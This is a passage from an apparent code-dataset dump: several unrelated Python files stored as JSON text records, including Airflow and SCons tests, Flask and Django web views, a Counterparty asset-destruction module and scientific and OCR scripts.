self.statusbar.setObjectName(_fromUtf8(\"statusbar\"))\n        MainWindow.setStatusBar(self.statusbar)\n        self.actionOpen_Experience = QtGui.QAction(MainWindow)\n        self.actionOpen_Experience.setObjectName(_fromUtf8(\"actionOpen_Experience\"))\n        self.actionQuit = QtGui.QAction(MainWindow)\n        self.actionQuit.setObjectName(_fromUtf8(\"actionQuit\"))\n        self.actionCondense_Experiences = QtGui.QAction(MainWindow)\n        self.actionCondense_Experiences.setObjectName(_fromUtf8(\"actionCondense_Experiences\"))\n        self.menuFile.addAction(self.actionOpen_Experience)\n        self.menuFile.addSeparator()\n        self.menuFile.addAction(self.actionQuit)\n        self.menuAction.addAction(self.actionCondense_Experiences)\n        self.menubar.addAction(self.menuFile.menuAction())\n        self.menubar.addAction(self.menuAction.menuAction())\n\n        self.retranslateUi(MainWindow)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"Experience Processor\", None))\n        self.menuFile.setTitle(_translate(\"MainWindow\", \"File\", None))\n        self.menuAction.setTitle(_translate(\"MainWindow\", \"Action\", None))\n        self.actionOpen_Experience.setText(_translate(\"MainWindow\", \"Open Experience...\", None))\n        self.actionQuit.setText(_translate(\"MainWindow\", \"Quit\", None))\n        self.actionCondense_Experiences.setText(_translate(\"MainWindow\", \"Condense Experiences\", None))\n\n"}
{"text": "# -*- coding: utf-8 -*-\n#\n# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\n#\nimport json\nimport mock\nimport unittest\n\nfrom airflow.exceptions import AirflowException\nfrom airflow.models import Connection\n\nfrom airflow.contrib.hooks.datadog_hook import DatadogHook\n\n\nAPP_KEY = 'app_key'\nAPI_KEY = 'api_key'\nMETRIC_NAME = 'metric'\nDATAPOINT = 7\nTAGS = ['tag']\nTYPE = 'rate'\nINTERVAL = 30\nTITLE = 'title'\nTEXT = 'text'\nAGGREGATION_KEY = 'aggregation-key'\nALERT_TYPE = 'warning'\nDATE_HAPPENED = 12345\nHANDLE = 'handle'\nPRIORITY = 'normal'\nRELATED_EVENT_ID = 7\nDEVICE_NAME = 'device-name'\n\n\nclass TestDatadogHook(unittest.TestCase):\n\n    @mock.patch('airflow.contrib.hooks.datadog_hook.initialize')\n    @mock.patch('airflow.contrib.hooks.datadog_hook.DatadogHook.get_connection')\n    def setUp(self, mock_get_connection, mock_initialize):\n        mock_get_connection.return_value = Connection(extra=json.dumps({\n            'app_key': APP_KEY,\n            'api_key': API_KEY,\n        }))\n        self.hook = DatadogHook()\n\n    @mock.patch('airflow.contrib.hooks.datadog_hook.initialize')\n    @mock.patch('airflow.contrib.hooks.datadog_hook.DatadogHook.get_connection')\n    def test_api_key_required(self, mock_get_connection, mock_initialize):\n        mock_get_connection.return_value = Connection()\n        with self.assertRaises(AirflowException) as ctx:\n            DatadogHook()\n        self.assertEqual(str(ctx.exception),\n                         'api_key must be specified in the Datadog connection details')\n\n    def test_validate_response_valid(self):\n        try:\n            self.hook.validate_response({'status': 'ok'})\n        except AirflowException:\n            self.fail('Unexpected AirflowException raised')\n\n    def test_validate_response_invalid(self):\n        with self.assertRaises(AirflowException):\n            self.hook.validate_response({'status': 'error'})\n\n    @mock.patch('airflow.contrib.hooks.datadog_hook.api.Metric.send')\n    def test_send_metric(self, mock_send):\n        mock_send.return_value = {'status': 'ok'}\n        self.hook.send_metric(\n            METRIC_NAME,\n            DATAPOINT,\n            tags=TAGS,\n            type_=TYPE,\n            interval=INTERVAL,\n        )\n        mock_send.assert_called_with(\n            metric=METRIC_NAME,\n            points=DATAPOINT,\n            host=self.hook.host,\n            tags=TAGS,\n            type=TYPE,\n            interval=INTERVAL,\n        )\n\n    @mock.patch('airflow.contrib.hooks.datadog_hook.api.Metric.query')\n    @mock.patch('airflow.contrib.hooks.datadog_hook.time.time')\n    def test_query_metric(self, mock_time, mock_query):\n        now = 12345\n        mock_time.return_value = now\n        mock_query.return_value = {'status': 'ok'}\n        self.hook.query_metric('query', 60, 30)\n        mock_query.assert_called_with(\n            start=now - 60,\n            end=now - 30,\n            query='query',\n        )\n\n    @mock.patch('airflow.contrib.hooks.datadog_hook.api.Event.create')\n    def test_post_event(self, mock_create):\n        mock_create.return_value = {'status': 'ok'}\n        self.hook.post_event(\n            TITLE,\n            TEXT,\n            aggregation_key=AGGREGATION_KEY,\n            alert_type=ALERT_TYPE,\n            date_happened=DATE_HAPPENED,\n            handle=HANDLE,\n            priority=PRIORITY,\n            related_event_id=RELATED_EVENT_ID,\n            tags=TAGS,\n            device_name=DEVICE_NAME,\n        )\n        mock_create.assert_called_with(\n            title=TITLE,\n            text=TEXT,\n            aggregation_key=AGGREGATION_KEY,\n            alert_type=ALERT_TYPE,\n            date_happened=DATE_HAPPENED,\n            handle=HANDLE,\n            priority=PRIORITY,\n            related_event_id=RELATED_EVENT_ID,\n            tags=TAGS,\n            host=self.hook.host,\n            device_name=DEVICE_NAME,\n            source_type_name=self.hook.source_type_name,\n        )\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "\"\"\"\n\n:mod:`lwr.managers` Module\n--------------------------\n\n.. automodule:: lwr.managers\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.core` Module\n---------------------\n\n.. automodule:: lwr.core\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.daemon` Module\n---------------------\n\n.. automodule:: lwr.daemon\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.scripts` Module\n---------------------\n\n.. automodule:: lwr.scripts\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.web` Module\n---------------------------\n\n.. automodule:: lwr.web\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.messaging` Module\n---------------------------\n\n.. automodule:: lwr.messaging\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.mesos` Module\n---------------------------\n\n.. automodule:: lwr.mesos\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.app` Module\n---------------------\n\n.. automodule:: lwr.app\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.manager_endpoint_util` Module\n---------------------------------\n\n.. automodule:: lwr.manager_endpoint_util\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.manager_factory` Module\n---------------------------------\n\n.. automodule:: lwr.manager_factory\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.locks` Module\n-----------------------\n\n.. automodule:: lwr.locks\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n:mod:`lwr.tools` Module\n-----------------------\n\n.. automodule:: lwr.tools\n    :members:\n    :undoc-members:\n    :show-inheritance:\n\n\"\"\"\n"}
{"text": "#!/usr/bin/env python\n#\n# Copyright (c) 2001 - 2016 The SCons Foundation\n#\n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n#\n# The above copyright notice and this permission notice shall be included\n# in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY\n# KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE\n# WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n#\n\n__revision__ = \"test/Repository/Local.py rel_2.5.1:3735:9dc6cee5c168 2016/11/03 14:02:02 bdbaddog\"\n\nimport os.path\n\nimport TestSCons\n\ntest = TestSCons.TestSCons()\n\ntest.subdir('repository', ['repository', 'src'],\n            'work', ['work', 'src'])\n\nrepository_aaa_out = test.workpath('repository', 'aaa.out')\nrepository_build_bbb_1 = test.workpath('repository', 'build', 'bbb.1')\nrepository_build_bbb_2 = test.workpath('repository', 'build', 'bbb.2')\nwork_aaa_mid = test.workpath('work', 'aaa.mid')\nwork_aaa_out = test.workpath('work', 'aaa.out')\nwork_build_bbb_1 = test.workpath('work', 'build', 'bbb.1')\nwork_build_bbb_2 = test.workpath('work', 'build', 'bbb.2')\n\nopts = \"-Y \" + test.workpath('repository')\n\n#\ntest.write(['repository', 'SConstruct'], r\"\"\"\ndef copy(env, source, target):\n    source = str(source[0])\n    target = str(target[0])\n    print 'copy() < %s > %s' % (source, target)\n    open(target, \"wb\").write(open(source, \"rb\").read())\n\nBuild = Builder(action=copy)\nenv = Environment(BUILDERS={'Build':Build}, BBB='bbb')\nenv.Build('aaa.mid', 'aaa.in')\nenv.Build('aaa.out', 'aaa.mid')\nLocal('aaa.out')\n\nExport(\"env\")\nVariantDir('build', 'src')\nSConscript('build/SConscript')\n\"\"\")\n\ntest.write(['repository', 'src', 'SConscript'], r\"\"\"\ndef bbb_copy(env, source, target):\n    target = str(target[0])\n    print 'bbb_copy()'\n    open(target, \"wb\").write(open('build/bbb.1', \"rb\").read())\n\nImport(\"env\")\nenv.Build('bbb.1', 'bbb.0')\nenv.Local('${BBB}.1')\nenv.Command('bbb.2', 'bbb.x', bbb_copy)\nenv.Depends('bbb.2', 'bbb.1')\n\"\"\")\n\ntest.write(['repository', 'aaa.in'], \"repository/aaa.in\\n\")\ntest.write(['repository', 'src', 'bbb.0'], \"repository/src/bbb.0\\n\")\ntest.write(['repository', 'src', 'bbb.x'], \"repository/src/bbb.x\\n\")\n\n#\ntest.run(chdir = 'repository', options = opts, arguments = '.')\n\ntest.fail_test(test.read(repository_aaa_out) != \"repository/aaa.in\\n\")\ntest.fail_test(test.read(repository_build_bbb_2) != \"repository/src/bbb.0\\n\")\n\ntest.up_to_date(chdir = 'repository', options = opts, arguments = '.')\n\n# Make the entire repository non-writable, so we'll detect\n# if we try to write into it accidentally.\ntest.writable('repository', 0)\n\n#\ntest.run(chdir = 'work', options = opts, arguments = 'aaa.out build/bbb.2')\n\ntest.fail_test(os.path.exists(work_aaa_mid))\ntest.fail_test(test.read(work_aaa_out) != \"repository/aaa.in\\n\")\ntest.fail_test(test.read(work_build_bbb_1) != \"repository/src/bbb.0\\n\")\ntest.fail_test(os.path.exists(work_build_bbb_2))\n\n#\ntest.write(['work', 'aaa.in'], \"work/aaa.in\\n\")\n\n#\ntest.run(chdir = 'work', options = opts, arguments = '.')\n\ntest.fail_test(test.read(work_aaa_mid) != \"work/aaa.in\\n\")\ntest.fail_test(test.read(work_aaa_out) != \"work/aaa.in\\n\")\n\ntest.up_to_date(chdir = 'work', options = opts, arguments = '.')\n\n#\ntest.pass_test()\n\n# Local Variables:\n# tab-width:4\n# indent-tabs-mode:nil\n# End:\n# vim: set expandtab tabstop=4 shiftwidth=4:\n"}
{"text": "# -*- coding: utf-8 -*-\n\nimport os\n\nfrom flask import Blueprint, render_template, send_from_directory, abort, flash\nfrom flask import current_app as APP\nfrom flask.ext.babel import gettext as _\nfrom flask.ext.login import login_required, current_user\n\nfrom lurcat.modules.message.forms import CreateMessageForm, ResponseMessageForm\nfrom lurcat.modules.message.models import Message\nfrom .models import User\n\n\nuser = Blueprint('user', __name__, url_prefix='/user')\n\n@user.route('/')\n@user.route('/<int:offset>')\n@login_required\ndef index(offset = 0):\n    if not current_user.is_authenticated():\n        abort(403)\n    create_form = CreateMessageForm()\n    message = Message()\n    messages = message.get_all_messages()\n    msgs = Message()\n    msgs = msgs.get_messages_feed(current_user)\n    print \"test:\"\n    print msgs\n    form = ResponseMessageForm(offset = offset,yes='1',no='2')\n    return render_template('user/index.html', user=current_user,form=create_form,response_form = form,messages=msgs,offset=offset)\n\n\n\n@user.route('/<int:user_id>/profile')\ndef profile(user_id):\n    user = User.get_by_id(user_id)\n    message = Message()\n    msgs = message.get_message_from_user(user)\n    return render_template('user/profile.html', user=user,messages= msgs,current_user=current_user,followed = current_user.is_following(user))\n\n\n@user.route('/<int:user_id>/avatar/<path:filename>')\n@login_required\ndef avatar(user_id, filename):\n    dir_path = os.path.join(APP.config['UPLOAD_FOLDER'], 'user_%s' % user_id)\n    return send_from_directory(dir_path, filename, as_attachment=True)\n\n\n@user.route('/follow_user/<int:user_id>')\n@login_required\ndef follow_user(user_id):\n    user = User.get_by_id(user_id)\n    current_user.follow(user)\n    flash(_(\"You are now following\") +\" %s\"%user.name,'success')\n    return render_template('user/profile.html', user=user,current_user=current_user,followed = current_user.is_following(user))\n\n@user.route('/unfollow_user/<int:user_id>')\n@login_required\ndef unfollow_user(user_id):\n    user = User.get_by_id(user_id)\n    current_user.unfollow(user)\n    flash(_(\"You are now not following\")+\" %s\"%user.name,'success')\n    return render_template('user/profile.html', user=user,current_user=current_user,followed = current_user.is_following(user))\n\n\n\n"}
{"text": "#encoding: utf-8\n\nimport cPickle as pickle\nfrom classify import load_cls, label_chars\nfrom cv2 import GaussianBlur\nfrom feature_extraction import get_zernike_moments, get_hu_moments, \\\n    extract_features, normalize_and_extract_features\nfrom functools import partial\nimport glob\nfrom multiprocessing.pool import Pool\nimport numpy as np\nimport os\nfrom sklearn.externals import joblib\nfrom sobel_features import sobel_features\nfrom transitions import transition_features\nfrom fast_utils import fnormalize, ftrim\n\ncls = load_cls('logistic-cls')\n\n# Load testing sets\nprint 'Loading test data'\n\ntsets = pickle.load(open('datasets/testing/training_sets.pkl', 'rb'))\n\nscaler = joblib.load('zernike_scaler-latest')\n\nprint 'importing classifier'\n\nprint cls.get_params()\n\nprint 'scoring ...'\nkeys = tsets.keys()\nkeys.sort()\nall_samples = []\n\n## Baseline accuracies for the data in tsets\nbaseline = [0.608, 0.5785123966942148, 0.4782608695652174, 0.7522123893805309, \n            0.6884057971014492, 0.5447154471544715, 0.9752066115702479, \n            0.9830508474576272]\n\n\ndef test_accuracy(t, clsf=None):\n    '''Get accuracy score for a testset t'''\n    if clsf:\n        cls = clsf\n    else:\n        global cls\n    \n    y = tsets[t][:,0]\n    x = tsets[t][:,1:]\n    \n    x3 = []\n    for j in x:\n        j = ftrim(j.reshape((32,16)).astype(np.uint8))\n        x3.append(normalize_and_extract_features(j))\n    \n    pred = cls.predict(x3)\n\n    s  = 0\n    for i, p in enumerate(pred):\n        if float(p) == y[i]:\n            s += 1.0            \n        else:\n            pass\n            print 'correct', label_chars[y[i]], '||', label_chars[p], t #, max(cls.predict_proba(x3[i])[0])\n\n    score = s / len(y)\n    return score\n\ndef test_all(clsf=None):\n    '''Run accuracy tests for all testsets'''\n    \n    print 'starting tests. this will take a moment'\n    \n    test_accuracy(keys[0], clsf)\n    \n    test_all = partial(test_accuracy, clsf=clsf)\n    p = Pool()\n    all_samples = p.map(test_all, keys)\n        \n    for t, s in zip(keys, all_samples):\n        print t, s\n    return np.mean(all_samples)\n\nif __name__ == '__main__':\n    print test_all()\n"}
{"text": "'''\nCreated on May 21, 2015\n\n@author: Button\n'''\n\nfrom src.bamm.common import config\nimport re\nimport traceback\n\nascii_codes = None\n\nuserlog = config.userlog\nmodderslog = config.modderslog\n\n\ndef _load_ascii_conversions(ascii_file):\n    \"\"\"Load ASCII conversions from file.\n\n    The file is structured as a .property file, with a new conversion on each\n    line.\n\n    Each line of the file should be in the format \" '%'=# \", where % is a\n    single character, and # is the character's position on code page 437 (the\n    basis of the Dwarf Fortress tileset).\n\n    Comments are not allowed in this file.\n\n    These conversions will later be used by the function\n    escape_problematic_literals.\n    \"\"\"\n    global ascii_codes\n    userlog.info(\"Loading ASCII conversions...\")\n    if ascii_codes is None:\n        ascii_codes = {}\n    try:\n        for line in open(ascii_file):\n            real_line = line.strip()\n            if len(real_line) == 0:\n                continue\n            elif '=' not in real_line:\n                userlog.warning('ASCII conversion file contains the \\\n                                improperly-formatted line %s .', real_line)\n            else:\n                point = real_line.rindex('=')\n                if real_line[:point] in ascii_codes.keys():\n                    userlog.warning('Duplicate entry for ascii replacement %s',\n                                    real_line[:point])\n                else:\n                    ascii_codes[real_line[:point]] = real_line[point+1:]\n        userlog.info(\"ASCII conversions loaded.\")\n    except TypeError:\n        userlog.error(\"Undefined ascii conversion file. Please add an 'ascii'\",\n                      \"property in\", config.runconfig, \".\")\n        userlog.error(traceback.format_exc())\n        raise\n    except:\n        userlog.error(\"Problem loading ASCII conversions. \" +\n                      \"If you have made changes to \" + ascii_file +\n                      \", please restore it. \" +\n                      \"Otherwise, please contact a BAMM! developer.\")\n        userlog.error(traceback.format_exc())\n        raise\n\n\ndef tags(line):\n    \"\"\"Return an ordered list of all the tags in this line, without brackets,\n    with literals escaped if necessary.\"\"\"\n    processed_line = escape_problematic_literals(line)\n    to_return = []        # list of strings, a la split()\n    while ('[' in processed_line and\n           ']' in processed_line and\n           processed_line.index('[') < processed_line.rindex(']')):\n\n        if processed_line.index(']') < processed_line.index('['):\n            processed_line = processed_line[processed_line.index('['):]\n\n        to_return.append(processed_line[processed_line.index('[')+1:\n                                        processed_line.index(']')])\n\n        processed_line = processed_line[processed_line.index(']')+1:]\n    return to_return\n\n\ndef escape_problematic_literals(line):\n    \"\"\" Returns line with its char literals replaced with their cp437 codes.\n\n    Char literals are usually used for defining tiles, and are two single\n    quotes around a character, so: '*'. Since this is the only case in which\n    the DF raw characters ']', '[' and ':' are allowed within a tag outside\n    their uses, and since cp437 codes are equally valid, replacing these with\n    their cp437 codes is harmless and streamlines lexing considerably.\n    \"\"\"\n    global ascii_codes\n\n    # Replace literal key characters with number codes\n    # Literal colons are going to require some special processing, because of\n    # the following case:  GROWTH:'r':'x': etc. That's why we can't just use\n    # a blind replaceAll.\n\n    # If odd, we are inside a tag. If even, we are outside a tag.\n    bracketscount = 0\n    count = 0                # Where we are in the string\n    quotescount = 0\n    while count < len(line)-2:\n        # Going from inside a tag to outside or vice versa\n        if (((bracketscount % 2 == 0 and line[count] == \"[\") or\n             (bracketscount % 2 == 1 and line[count] == \"]\"))):\n            bracketscount += 1\n        # We are inside a tag and we have discovered a ' character beginning a\n        # literal value, with another 2 characters down on the other side.\n        elif (quotescount % 2 == 0 and bracketscount % 2 == 1 and\n              line[count:count+3] in ascii_codes.keys()):\n            # If the character could be a problem for later processing, replace\n            #  it with its ascii code.\n            line = line[:count] + ascii_codes[line[count:count+3]] + \\\n                line[count+3:]\n        elif line[count] == \"'\":\n            quotescount += 1\n        elif bracketscount % 2 == 1 and line[count] == ':':\n            quotescount = 0\n        count += 1\n    # line has now had its literal \"use this tile\" versions of its special\n    # characters replaced with their numbers.\n    return line\n\n\ndef path_compatible(full_path, allowed_paths):\n    \"\"\"Return True if full_path regex matches anything in allowed_paths, or\n    False otherwise.\"\"\"\n    full_path = full_path.replace('\\\\', '/')\n    for allowed_path in allowed_paths:\n        allowed_path = allowed_path.replace('\\\\', '/')\n        match = re.match(allowed_path, full_path)\n        if match is not None:\n            return True\n    return False\n"}
{"text": "#!/bin/env python\n\nimport numpy as np\nimport scipy.signal as ss\nimport astropy.io.fits as fits\nimport matplotlib.pyplot as plt\n\n\ninpt = str(raw_input(\"File: \"))\nlc = fits.open(inpt)\nbin = float(raw_input(\"bin size (or camera resolution): \"))\n\n# Convert to big-endian array is necessary to the lombscargle function\ntime = np.array(lc[1].data[\"TIME\"], dtype='float64')\ntime -= time.min()\nrate = np.array(lc[1].data[\"RATE\"], dtype='float64')\n\n# Exclude NaN and negative values -------------------------\nprint ''\nprint 'Excluding nan and negative values...'\nprint ''\nexclude = []\nfor i in xrange(len(rate)):\n    if rate[i] > 0:\n        pass\n    else:\n        exclude.append(i)\n\nexclude = np.array(exclude)\nnrate = np.delete(rate, exclude)\nntime = np.delete(time, exclude)\n#-----------------------------------------------------------\n\n# normalize rate array\nmean = nrate.mean()\nnrate -= nrate.mean()\n\n# normalization to the periodogram\nnorm = ntime.shape[0]\n\n# duration of observation\ninterval = time.max()-time.min()\n\n# minimum frequency limited to 0,01/T\nfreqmin = 0.01/interval\n\n# maximium Nyquist frequency limited by time resolution\nfreqmax = 1.0/(2.0*bin)\n\n# size of the array of frequencies\nnint = 10*len(nrate)\n\n# Frequency array\nfreqs = np.linspace(freqmin, freqmax, nint)\n\n# scipy.signal.lombscargle uses angular frequencies\nafreqs = 2.0*np.pi*freqs\n\nprint 'f_max = ', max(freqs)\nprint 'f_min = ', min(freqs)\nprint \"T_obs =\", interval\nprint \"N_points = \", norm\nprint \"N_freqs = \", nint\n\n# Ther periodogram itself\npgram = ss.lombscargle(ntime, nrate, afreqs)\n\n# Normalize pgram to units of nrate/freq\npnorm = np.sqrt(4.0*(pgram/norm))\n\n# # Plot lightcurve on top panel\n# plt.subplot(2, 1, 1)\n# plt.plot(ntime, nrate, 'bo-')\n# plt.xlabel('Tempo (s)', fontsize=12)\n# plt.ylabel('Cts. s$^{{-1}}$', fontsize=12)\n# plt.xlim(time.min(), time.max())\n#\n# # Plot powerspectrum on bottom panel\n# plt.subplot(2, 1, 2)\nplt.plot(freqs, pnorm, 'b-',\n    label='T$_{{pico}}$ = {0:.0f} s'.format(1.0/freqs[np.argmax(pnorm)]))\nplt.xlabel('Frequencia (Hz)', fontsize=12)\nplt.ylabel('Potencia', fontsize=12)\nplt.xlim(min(freqs), max(freqs))\nplt.legend(loc=1)\n\n# save and show plot\nplt.savefig('lombscargle_tests.pdf', bbox_width='tight', format='pdf',\n        orientation='landscape')\nplt.show()\n"}
{"text": "#! /usr/bin/python3\n\n\"\"\"Destroy a quantity of an asset.\"\"\"\n\nimport struct\nimport json\nimport logging\nlogger = logging.getLogger(__name__)\n\nfrom counterpartylib.lib import util\nfrom counterpartylib.lib import config\nfrom counterpartylib.lib import script\nfrom counterpartylib.lib import message_type\nfrom counterpartylib.lib.script import AddressError\nfrom counterpartylib.lib.exceptions import *\n\nFORMAT = '>QQ8s'\nLENGTH = 8 + 8 + 8\nID = 110\n\n\ndef initialise(db):\n    cursor = db.cursor()\n    cursor.execute('''CREATE TABLE IF NOT EXISTS destructions(\n                      tx_index INTEGER PRIMARY KEY,\n                      tx_hash TEXT UNIQUE,\n                      block_index INTEGER,\n                      source TEXT,\n                      asset INTEGER,\n                      quantity INTEGER,\n                      tag TEXT,\n                      status TEXT,\n                      FOREIGN KEY (tx_index, tx_hash, block_index) REFERENCES transactions(tx_index, tx_hash, block_index))\n                   ''')\n    cursor.execute('''CREATE INDEX IF NOT EXISTS\n                      status_idx ON destructions (status)\n                   ''')\n    cursor.execute('''CREATE INDEX IF NOT EXISTS\n                      address_idx ON destructions (source)\n                   ''')\n\n\ndef pack(db, asset, quantity, tag):\n    data = message_type.pack(ID)\n    if isinstance(tag, str):\n        tag = bytes.fromhex(tag)\n\n    data += struct.pack(FORMAT, util.get_asset_id(db, asset, util.CURRENT_BLOCK_INDEX), quantity, tag)\n    return data\n\n\ndef unpack(db, message):\n    try:\n        asset_id, quantity, tag = struct.unpack(FORMAT, message)\n        asset = util.get_asset_name(db, asset_id, util.CURRENT_BLOCK_INDEX)\n\n    except struct.error:\n        raise UnpackError('could not unpack')\n\n    except AssetIDError:\n        raise UnpackError('asset id invalid')\n\n    return asset, quantity, tag\n\n\ndef validate (db, source, destination, asset, quantity):\n\n    try:\n        util.get_asset_id(db, asset, util.CURRENT_BLOCK_INDEX)\n    except AssetError:\n        raise ValidateError('asset invalid')\n\n    try:\n        script.validate(source)\n    except AddressError:\n        raise ValidateError('source address invalid')\n\n    if destination:\n        raise ValidateError('destination exists')\n\n    if asset == config.BTC:\n        raise ValidateError('cannot destroy {}'.format(config.BTC))\n\n    if type(quantity) != int:\n        raise ValidateError('quantity not integer')\n\n    if quantity > config.MAX_INT:\n        raise ValidateError('integer overflow, quantity too large')\n\n    if quantity < 0:\n        raise ValidateError('quantity negative')\n\n    if util.get_balance(db, source, asset) < quantity:\n        raise BalanceError('balance insufficient')\n\n\ndef compose (db, source, asset, quantity, tag):\n    # resolve subassets\n    asset = util.resolve_subasset_longname(db, asset)\n\n    validate(db, source, None, asset, quantity)\n    data = pack(db, asset, quantity, tag)\n\n    return (source, [], data)\n\n\ndef parse (db, tx, message):\n    status = 'valid'\n\n    asset, quantity, tag = None, None, None\n\n    try:\n        asset, quantity, tag = unpack(db, message)\n        validate(db, tx['source'], tx['destination'], asset, quantity)\n        util.debit(db, tx['source'], asset, quantity, 'destroy', tx['tx_hash'])\n\n    except UnpackError as e:\n        status = 'invalid: ' + ''.join(e.args)\n\n    except (ValidateError, BalanceError) as e:\n        status = 'invalid: ' + ''.join(e.args)\n\n    bindings = {\n                'tx_index': tx['tx_index'],\n                'tx_hash': tx['tx_hash'],\n                'block_index': tx['block_index'],\n                'source': tx['source'],\n                'asset': asset,\n                'quantity': quantity,\n                'tag': tag,\n                'status': status,\n               }\n    if \"integer overflow\" not in status:\n        sql = 'insert into destructions values(:tx_index, :tx_hash, :block_index, :source, :asset, :quantity, :tag, :status)'\n        cursor = db.cursor()\n        cursor.execute(sql, bindings)\n    else:\n        logger.warn(\"Not storing [destroy] tx [%s]: %s\" % (tx['tx_hash'], status))\n        logger.debug(\"Bindings: %s\" % (json.dumps(bindings), ))\n\n\n# vim: tabstop=8 expandtab shiftwidth=4 softtabstop=4\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# Licensed to the Apache Software Foundation (ASF) under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  The ASF licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing,\n# software distributed under the License is distributed on an\n# \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n# KIND, either express or implied.  See the License for the\n# specific language governing permissions and limitations\n# under the License.\nimport datetime\nimport unittest\n\nimport mock\n\nfrom airflow import DAG\nfrom airflow.operators.bash_operator import BashOperator\nfrom airflow.operators.python_operator import PythonOperator\nfrom airflow.utils import dot_renderer\n\n\nSTART_DATE = datetime.datetime.now()\n\n\nclass TestDotRenderer(unittest.TestCase):\n    def test_should_render_dag(self):\n\n        dag = DAG(dag_id=\"DAG_ID\")\n        task_1 = BashOperator(dag=dag, start_date=START_DATE, task_id=\"first\", bash_command=\"echo 1\")\n        task_2 = BashOperator(dag=dag, start_date=START_DATE, task_id=\"second\", bash_command=\"echo 1\")\n        task_3 = PythonOperator(\n            dag=dag, start_date=START_DATE, task_id=\"third\", python_callable=mock.MagicMock()\n        )\n        task_1 >> task_2\n        task_1 >> task_3\n\n        dot = dot_renderer.render_dag(dag)\n        source = dot.source\n        # Should render DAG title\n        self.assertIn(\"label=DAG_ID\", source)\n        self.assertIn(\"first\", source)\n        self.assertIn(\"second\", source)\n        self.assertIn(\"third\", source)\n        self.assertIn(\"first -> second\", source)\n        self.assertIn(\"first -> third\", source)\n        self.assertIn('fillcolor=\"#f0ede4\"', source)\n        self.assertIn('fillcolor=\"#f0ede4\"', source)\n"}
{"text": "from django.shortcuts import render, get_object_or_404\nfrom django.http import HttpResponse, HttpResponseRedirect\nfrom django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin\nfrom django.views.generic import View\nfrom django.urls import reverse\nfrom django.contrib import messages\nfrom suite.models import Club, Division, Budget\nfrom suite.forms import DivisionCreateForm, BudgetCreateForm\n\nfrom guardian.shortcuts import get_perms\nfrom django.core.exceptions import PermissionDenied\n\nclass Budget(UserPassesTestMixin, LoginRequiredMixin, View):\n  template_name = 'dashboard/budget.html'\n  division_form_class  = DivisionCreateForm\n  budget_form_class = BudgetCreateForm\n\n  def test_func(self):\n    club = get_object_or_404(Club, pk=self.kwargs['club_id'])\n    if 'can_access_budget' not in get_perms(self.request.user, club):\n      raise PermissionDenied\n\n    return True\n\n  def generate_books(self, divs):\n    books = []\n    for div in divs:\n      budgets = div.budget_set.all()\n      total_budget = 0\n      for budget in budgets:\n        total_budget = total_budget + budget.planned\n\n      events = div.event_set.all()\n      total_expense = 0\n      for event in events:\n        total_expense = total_expense + event.event_cost\n\n      books.append({ 'division' : div, 'budgets' : budgets, 'events' : events,\n        'total_budget' : total_budget, 'total_expense' : total_expense })\n\n    return books\n\n  def get(self, request, club_id, *args, **kwargs):\n    club = Club.objects.get(pk=club_id)\n\n    budget_form = self.budget_form_class()\n    budget_form.fields['did'].queryset = Division.objects.filter(cid=club)\n\n    division_form = self.division_form_class\n\n    books = self.generate_books(club.division_set.all())\n\n    total_budget = 0\n    total_expense = 0\n    for book in books:\n      total_budget = total_budget + book['total_budget']\n      total_expense = total_expense + book['total_expense']\n\n    return render(request, self.template_name, { 'books': books,\n                                                 'club': club,\n                                                 'budget_form' : budget_form,\n                                                 'division_form' : division_form,\n                                                 'total_budget' : total_budget,\n                                                 'total_expense' : total_expense})\n\n  def 